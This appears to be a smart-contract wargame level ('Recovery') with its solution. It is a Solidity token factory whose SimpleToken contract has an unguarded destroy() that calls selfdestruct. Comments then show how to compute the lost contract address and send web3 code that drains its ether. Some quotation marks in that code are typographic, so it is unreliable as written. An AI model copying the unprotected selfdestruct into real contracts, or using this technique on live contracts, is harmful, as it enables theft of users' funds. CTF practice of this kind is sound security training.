/** A contract creator has built a very simple token factory contract. Anyone can create new tokens with ease. 

After deploying the first token contract, the creator sent `0.001` ether to obtain more tokens. They have since lost 

the contract address.

This level will be completed if you can recover (or remove) the `0.001` ether from the lost contract address. */


// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Recovery {

  //generate tokens
  function generateToken(string memory _name, uint256 _initialSupply) public {
    new SimpleToken(_name, msg.sender, _initialSupply);
  
  }
}

contract SimpleToken {

  using SafeMath for uint256;
  // public variables
  string public name;
  mapping (address => uint) public balances;

  // constructor
  constructor(string memory _name, address _creator, uint256 _initialSupply) public {
    name = _name;
    balances[_creator] = _initialSupply;
  }

  // collect ether in return for tokens
  receive() external payable {
    balances[msg.sender] = msg.value.mul(10);
  }

  // allow transfers of tokens
  function transfer(address _to, uint _amount) public { 
    require(balances[msg.sender] >= _amount);
    balances[msg.sender] = balances[msg.sender].sub(_amount);
    balances[_to] = _amount;
  }

  // clean up after ourselves
  function destroy(address payable _to) public {
    selfdestruct(_to);
  }
}

/** To beat this level you need to know how contract addresses are created.

They are created based on the creator address and the nonce.

The formula is like this: address = rightmost_20_bytes(keccak(RLP(sender address, nonce)))

To get RLP encoding address: web3.utils.soliditySha3("0xd6", "0x94", "0x03dbEF34DB074C4B08e3282d66A4745414503b19", "0x01")

"0xd6", "0x94" (read RLP docs)

"0x03dbEF34DB074C4B08e3282d66A4745414503b19" (contracts address)

"0x01" (hex value of 1, because we want the first transaction)

We get this value: '0x73826fb1e6d5ae747935b15b356ee4d825e90a4a3c72d231165418341f880a23’

We count 40 characters (20 bytes) from right to left to get contract address: 356ee4d825e90a4a3c72d231165418341f880a23

data = web3.eth.abi.encodeFunctionCall({
        name: “destroy”,
        type: “function”,
        inputs: [{
                 type: “address”,
                 name: “_to”,
         }]
},  [player]);

await web3.eth.sendTransaction({
to: "0x356eE4d825e90a4a3c72D231165418341f880a23",
from: player,
data: data
}) */